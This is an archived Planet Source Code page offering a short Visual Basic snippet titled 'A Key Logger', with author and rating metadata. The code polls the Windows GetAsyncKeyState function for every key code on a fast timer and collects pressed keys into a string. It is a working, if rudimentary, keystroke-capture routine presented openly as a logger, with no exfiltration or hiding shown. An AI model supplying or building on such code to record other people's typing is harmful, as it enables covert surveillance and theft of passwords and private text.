<div align="center">

## A Key Logger


</div>

### Description

It Logs Your Key Presses

Place This Code In A Timer On Interval Less Then 20 The Faster It Is The

better But It Consumes More System Rescources
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Adam Jacob Muller](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/adam-jacob-muller.md)
**Level**          |Unknown
**User Rating**    |3.0 (12 globes from 4 users)
**Compatibility**  |VB 4\.0 \(32\-bit\), VB 5\.0, VB 6\.0
**Category**       |[Windows API Call/ Explanation](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/windows-api-call-explanation__1-39.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/adam-jacob-muller-a-key-logger__1-2653/archive/master.zip)

### API Declarations

```
Declare Function GetAsyncKeyState Lib "user32" (ByVal dwMessage As Long) As Integer
```


### Source Code

```
'Place This Code In A Timer On Interval Less Then 20 The Faster It Is The
'better But It Consumes More System Rescources
Dim KeyLoop As Byte
Dim FoundKeys As String
Dim KeyResult As Long
For KeyLoop = 1 To 255
 KeyResult = GetAsyncKeyState(KeyLoop)
 If KeyResult = -32767 Then
 FoundKeys = FoundKeys + Chr(KeyLoop)
 End If
Next
```

